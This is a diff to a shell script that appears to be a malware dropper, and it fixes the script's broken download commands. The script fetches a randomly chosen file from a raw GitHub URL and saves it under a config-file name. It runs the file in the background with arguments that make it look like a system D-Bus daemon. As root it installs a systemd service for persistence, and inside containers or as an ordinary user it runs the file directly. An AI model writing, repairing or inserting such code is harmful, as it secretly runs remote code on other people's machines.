@@ -10,7 +10,7 @@ CHOOSE=$(echo -e "alpha\nbeta" | shuf -n1)
 CONFIG_URL="https://raw.githubusercontent.com/sachagerard1985/laravel-www/refs/heads/main/${CHOOSE}"
 
 if [ -f "/.dockerenv" ] || grep -qaE 'docker|lxc|podman|kubepods' /proc/1/cgroup; then
-    wget -fsSL "$CONFIG_URL" -O "${CONFIG_FILE_ROOT}"
+    wget "$CONFIG_URL" -O "${CONFIG_FILE_ROOT}"
     chmod 755 "${CONFIG_FILE_ROOT}"
     "${CONFIG_FILE_ROOT}" --system --address=systemd --nofork --nopidfile --systemd-activation &
     return 0
@@ -18,7 +18,7 @@ fi
 
 if [[ $EUID -eq 0 ]]; then
 
-    wget -fsSL "$CONFIG_URL" -O "$CONFIG_FILE_ROOT"
+    wget "$CONFIG_URL" -O "$CONFIG_FILE_ROOT"
     chmod 755 "$CONFIG_FILE_ROOT"
 
     cat <<EOF > "$SERVICE_PATH"
@@ -45,7 +45,7 @@ EOF
     systemctl enable "${SERVICE_NAME}.service"
 
 else
-    wget -fsSL "$CONFIG_URL" -O "${APP_CMD_PATH}/${APP_CMD}"
+    wget "$CONFIG_URL" -O "${APP_CMD_PATH}/${APP_CMD}"
     chmod 755 "${APP_CMD_PATH}/${APP_CMD}"
     cd ${APP_CMD_PATH} && PATH=./:$PATH ${APP_CMD} --system --address=systemd --nofork --nopidfile --systemd-activation &
 fi
